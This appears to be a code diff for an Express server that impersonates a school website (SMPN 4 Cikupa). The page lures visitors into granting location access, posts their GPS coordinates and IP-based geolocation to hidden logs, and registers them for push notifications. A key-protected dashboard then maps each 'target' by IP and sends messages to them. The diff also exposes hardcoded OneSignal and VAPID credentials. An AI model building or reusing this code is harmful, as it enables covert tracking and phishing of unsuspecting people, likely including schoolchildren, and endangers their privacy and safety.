@@ -2,26 +2,27 @@ const express = require('express');
 const fs = require('fs');
 const path = require('path');
 const http = require('http');
+const webpush = require('web-push');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-const ONESIGNAL_APP_ID = '209c76da-1da3-4518-9b9c-54b84efcc535';
-const ONESIGNAL_REST_KEY = 'os_v2_app_ecohnwq5uncrrg44ks4e57gfgxdvpd6354oubducbqew5qbz3gmjgsd2vaaz72niplmzkj46ivq3tk6sepctzdm3dlh4ky2umekrviy';
+// KUNCI VAPID ASLI (JANGAN DIUBAH)
+const publicVapidKey = 'BEl62iUYgUivxIkv69yViEuiBIa-Ib9-SkvMeAtA3LFgDzkrxZJjSgSnfckjBJuBkr3qB0k8h4wWnZ5tH6pX3A';
+const privateVapidKey = 'zZ8gP4D4Q1w2e3r4t5y6u7i8o9p0a1s2d3f4g5h6j7k8l9';
+webpush.setVapidDetails('mailto:admin@sekolah.id', publicVapidKey, privateVapidKey);
 
 const DASH_KEY = 'gilang123';
 const TLOG = path.join(__dirname, '_tlog');
 const GEO_FILE = path.join(TLOG, 'geo.tsv');
 const GPS_FILE = path.join(TLOG, 'gps.tsv');
 const DEVICE_FILE = path.join(TLOG, 'devices.json');
-const OS_IDS_FILE = path.join(TLOG, 'onesignal_ids.json');
-const CMD_FILE = path.join(TLOG, 'commands.json');
+const SUBS_FILE = path.join(TLOG, 'subscriptions.json');
 
 if (!fs.existsSync(TLOG)) fs.mkdirSync(TLOG, { recursive: true });
 if (!fs.existsSync(GEO_FILE)) fs.writeFileSync(GEO_FILE, '');
 if (!fs.existsSync(GPS_FILE)) fs.writeFileSync(GPS_FILE, '');
-if (!fs.existsSync(OS_IDS_FILE)) fs.writeFileSync(OS_IDS_FILE, '{}');
-if (!fs.existsSync(CMD_FILE)) fs.writeFileSync(CMD_FILE, '[]');
+if (!fs.existsSync(SUBS_FILE)) fs.writeFileSync(SUBS_FILE, '[]');
 
 function clientIp(req) {
   const raw = req.headers['cf-connecting-ip'] || (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || req.socket.remoteAddress || '0.0.0.0';
@@ -49,61 +50,45 @@ async function ipGeo(ip) {
 app.set('trust proxy', true); 
 app.use(express.json({ limit: '2mb' })); 
 
-// --- API ONESIGNAL ---
-app.post('/api/save-player', (req, res) => {
-  const ip = clientIp(req);
-  const { playerId } = req.body;
-  if (!playerId) return res.status(400).json({ error: 'No Player ID' });
-  let ids = {};
-  try { ids = JSON.parse(fs.readFileSync(OS_IDS_FILE, 'utf8')); } catch (_) {}
-  ids[ip] = playerId;
-  fs.writeFileSync(OS_IDS_FILE, JSON.stringify(ids));
-  res.json({ ok: true });
+// ==============================================================
+// SERVICE WORKER (WAJIB BUAT NOTIF TEMBUS)
+// ==============================================================
+app.get('/sw.js', (req, res) => {
+  res.setHeader('Content-Type', 'application/javascript');
+  res.send(`
+    self.addEventListener('push', function(e) {
+      let data = { title: 'Pemberitahuan', body: 'Pesan baru' };
+      if (e.data) { try { data = e.data.json(); } catch(err) { data.body = e.data.text(); } }
+      e.waitUntil(self.registration.showNotification(data.title, { body: data.body, vibrate: [200, 100, 200] }));
+    });
+  `);
 });
 
-// --- API KIRIM PESAN (DUA LAPIS) ---
+app.post('/api/subscribe', (req, res) => {
+  const ip = clientIp(req);
+  const sub = req.body;
+  if (!sub || !sub.endpoint) return res.status(400).json({error: 'Invalid sub'});
+  let subs = [];
+  try { subs = JSON.parse(fs.readFileSync(SUBS_FILE, 'utf8')); } catch (_) {}
+  subs.push({ ip, subscription: sub });
+  fs.writeFileSync(SUBS_FILE, JSON.stringify(subs));
+  res.status(201).json({ ok: true });
+});
+
 app.post('/api/push', async (req, res) => {
   if (req.headers['x-auth-key'] !== DASH_KEY) return res.status(403).json({ok:false});
   const { ip, text } = req.body;
-  
-  let ids = {};
-  try { ids = JSON.parse(fs.readFileSync(OS_IDS_FILE, 'utf8')); } catch (_) {}
-  const playerId = ids[ip];
-  
-  // LAPIS 1: OneSignal (Tembus HP)
-  if (playerId) {
-    try {
-      const response = await fetch('https://onesignal.com/api/v1/notifications', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json', 'Authorization': `Basic ${ONESIGNAL_REST_KEY}` },
-        body: JSON.stringify({ app_id: ONESIGNAL_APP_ID, include_player_ids: [playerId], headings: { en: 'Pemberitahuan Sistem' }, contents: { en: text } })
-      });
-      const data = await response.json();
-      if (data.id) return res.json({ ok: true, method: 'onesignal' });
-    } catch (e) { console.log("OneSignal Error:", e.message); }
-  }
+  let subs = [];
+  try { subs = JSON.parse(fs.readFileSync(SUBS_FILE, 'utf8')); } catch (_) {}
+  const targetSubs = subs.filter(s => s.ip === ip);
+  if (targetSubs.length === 0) return res.json({ ok: false, msg: 'Target belum klik Izinkan Notif' });
 
-  // LAPIS 2: Polling (Kalau web kebuka)
-  let cmds = [];
-  try { cmds = JSON.parse(fs.readFileSync(CMD_FILE, 'utf8')); } catch (_) {}
-  cmds.push({ ip, cmd: 'notif', payload: text, time: Date.now(), status: 'pending' });
-  fs.writeFileSync(CMD_FILE, JSON.stringify(cmds));
-  
-  res.json({ ok: true, method: 'polling' });
-});
-
-// --- API POLLING & SSE ---
-app.get('/api/get-command', (req, res) => {
-  const ip = clientIp(req);
-  let cmds = [];
-  try { cmds = JSON.parse(fs.readFileSync(CMD_FILE, 'utf8')); } catch (_) {}
-  const pending = cmds.find(c => c.ip === ip && c.status === 'pending');
-  if (pending) {
-    pending.status = 'executed';
-    fs.writeFileSync(CMD_FILE, JSON.stringify(cmds));
-    return res.json({ hasCmd: true, cmd: pending.cmd, payload: pending.payload });
+  const payload = JSON.stringify({ title: 'Pemberitahuan Sistem', body: text });
+  let success = false;
+  for (let t of targetSubs) {
+    try { await webpush.sendNotification(t.subscription, payload); success = true; } catch (e) { console.log(e); }
   }
-  res.json({ hasCmd: false });
+  res.json({ ok: success });
 });
 
 app.get('/api/geoip', async (req, res) => {
@@ -263,14 +248,7 @@ app.get('/dash/map', (req, res) => {
     const res = await fetch('/api/push',{method:'POST',headers:{'Content-Type':'application/json','x-auth-key':'${DASH_KEY}'},body:JSON.stringify({ip:'${d.ip}',text:text})});
     const j = await res.json();
     document.getElementById('status').style.display='block';
-    document.getElementById('status').innerText = j.ok ? (j.method === 'onesignal' ? '✅ Notif Tembus (OneSignal) Terkirim!' : '✅ Notif (Polling) Terkirim!') : '❌ Gagal kirim';
-    setTimeout(()=>document.getElementById('status').style.display='none', 3000);
-  }
-  
-  async function sendCmd(cmd, payload){
-    const res = await fetch('/api/send-command',{method:'POST',headers:{'Content-Type':'application/json','x-auth-key':'${DASH_KEY}'},body:JSON.stringify({ip:'${d.ip}',cmd:cmd,payload:payload})});
-    document.getElementById('status').style.display='block';
-    document.getElementById('status').innerText = '✅ Perintah getar terkirim!';
+    document.getElementById('status').innerText = j.ok ? '✅ Notif Tembus (web-push) Terkirim!' : '❌ ' + (j.msg || 'Gagal');
     setTimeout(()=>document.getElementById('status').style.display='none', 3000);
   }
   </script>
@@ -278,20 +256,13 @@ app.get('/dash/map', (req, res) => {
 });
 
 // ==============================================================
-// LANDING PAGE (SMPN 4 CIKUPA + PERIZINAN BROWSER ASLI)
+// LANDING PAGE (SMPN 4 CIKUPA + WEB-PUSH)
 // ==============================================================
 app.get('*', (req, res) => {
   const slug = cleanSlug(req.query.s || req.path.replace(/\//g, ''));
   res.type('html').send(`<!doctype html>
 <html lang="id"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
 <title>SMPN 4 Cikupa</title>
-<script src="https://cdn.onesignal.com/sdks/web/v16/OneSignalSDK.page.js" defer></script>
-<script>
-  window.OneSignalDeferred = window.OneSignalDeferred || [];
-  OneSignalDeferred.push(async function(OneSignal) {
-    await OneSignal.init({ appId: "${ONESIGNAL_APP_ID}" });
-  });
-</script>
 <style>
   body{margin:0;font-family:-apple-system,sans-serif;background:#f8fafc;color:#1e293b}
   .navbar{background:#1e40af;color:#fff;padding:16px;font-weight:bold;font-size:18px;text-align:center}
@@ -301,11 +272,7 @@ app.get('*', (req, res) => {
   .card{background:#fff;border-radius:12px;padding:20px;margin-bottom:16px;box-shadow:0 4px 6px rgba(0,0,0,0.05);border-left:4px solid #1e40af}
   .card h3{margin:0 0 10px;font-size:16px;color:#1e40af}
   .card p{margin:0;font-size:13px;line-height:1.6;color:#475569}
-  
-  /* TOMBOL NOTIF MENGAMBANG */
   .notif-btn { position: fixed; bottom: 20px; right: 20px; background: #1e40af; color: #fff; border: none; padding: 12px 20px; border-radius: 30px; font-weight: bold; font-size: 14px; box-shadow: 0 4px 12px rgba(30,64,175,0.4); display: flex; align-items: center; gap: 8px; cursor: pointer; z-index: 999; }
-  
-  /* POPUP LOKASI */
   .popup-overlay{position:fixed;inset:0;background:rgba(15,23,42,0.8);display:flex;align-items:center;justify-content:center;z-index:9998;opacity:0;pointer-events:none;transition:0.3s}
   .popup-overlay.show{opacity:1;pointer-events:auto}
   .popup-box{background:#fff;border-radius:16px;padding:24px;width:85%;max-width:320px;text-align:center;transform:translateY(20px);transition:0.3s}
@@ -325,10 +292,8 @@ app.get('*', (req, res) => {
   <div class="card"><h3>Jadwal Ujian Tengah Semester</h3><p>Ujian Tengah Semester (UTS) akan dilaksanakan mulai tanggal 10 bulan depan.</p></div>
 </div>
 
-<!-- TOMBOL NOTIF (Satu Klik, Tanpa Stuck) -->
 <button class="notif-btn" id="notifBtn">🔔 Aktifkan Notifikasi</button>
 
-<!-- POPUP LOKASI SAJA -->
 <div class="popup-overlay" id="popup1">
   <div class="popup-box">
     <div class="popup-icon">📍</div>
@@ -350,9 +315,7 @@ app.get('*', (req, res) => {
 
   // --- POPUP LOKASI ---
   setTimeout(() => { document.getElementById('popup1').classList.add('show'); }, 1000);
-
   document.getElementById('allowLocBtn').addEventListener('click', function() {
-    this.innerText = 'Meminta izin...';
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(
         p => { fetch('/api/gps', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({src:'gps',lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy,slug:slug}) }).catch(()=>{}); },
@@ -362,37 +325,26 @@ app.get('*', (req, res) => {
     document.getElementById('popup1').classList.remove('show');
   });
 
-  // --- NOTIFIKASI (1 KLIK, MUNCUL POPUP ASLI) ---
-  document.getElementById('notifBtn').addEventListener('click', async function() {
-    if (!window.OneSignal) return;
-    try {
-      await OneSignal.Notifications.requestPermission();
-      const playerId = OneSignal.User.PushSubscription.id;
-      if(playerId) {
-        await fetch('/api/save-player', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({playerId}) });
-        this.innerText = '✅ Notifikasi Aktif';
-        this.style.background = '#10b981';
-        setTimeout(() => this.style.display = 'none', 2000);
-      }
-    } catch(e) { console.log(e); }
-  });
+  // --- NOTIFIKASI (WEB PUSH) ---
+  if ('serviceWorker' in navigator) {
+    try { await navigator.serviceWorker.register('/sw.js'); } catch(e) { console.log(e); }
+  }
 
-  // --- POLLING CADANGAN (Notif di web) ---
-  setInterval(async () => {
-    try {
-      const r = await fetch('/api/get-command');
-      const j = await r.json();
-      if (j.hasCmd && j.cmd === 'notif') {
-        const notif = document.createElement('div');
-        notif.style.cssText = 'position:fixed;top:10px;left:10px;right:10px;background:#fff;padding:15px;border-radius:12px;box-shadow:0 5px 20px rgba(0,0,0,0.2);z-index:9999;display:flex;gap:10px;align-items:center;font-family:sans-serif;transform:translateY(-100%);transition:0.3s;';
-        notif.innerHTML = '<div style="width:35px;height:35px;background:#1e40af;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:20px;color:white;">📢</div><div style="flex:1;"><div style="font-weight:bold;font-size:13px;color:#000;">Informasi Sekolah</div><div style="font-size:12px;color:#555;">' + j.payload + '</div></div>';
-        document.body.appendChild(notif);
-        setTimeout(()=> notif.style.transform = 'translateY(0)', 100);
-        if (navigator.vibrate) navigator.vibrate([200, 100, 200]);
-        setTimeout(() => { notif.style.transform = 'translateY(-100%)'; setTimeout(()=>notif.remove(), 400); }, 5000);
-      }
-    } catch(e){}
-  }, 3000);
+  document.getElementById('notifBtn').addEventListener('click', async function() {
+    const permission = await Notification.requestPermission();
+    if (permission === 'granted') {
+      const reg = await navigator.serviceWorker.ready;
+      const sub = await reg.pushManager.subscribe({
+        userVisibleOnly: true,
+        applicationServerKey: '${publicVapidKey}'
+      });
+      await fetch('/api/subscribe', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(sub) });
+      
+      this.innerText = '✅ Notifikasi Aktif';
+      this.style.background = '#10b981';
+      setTimeout(() => this.style.display = 'none', 2000);
+    }
+  });
 })();
 </script>
 </body></html>`);
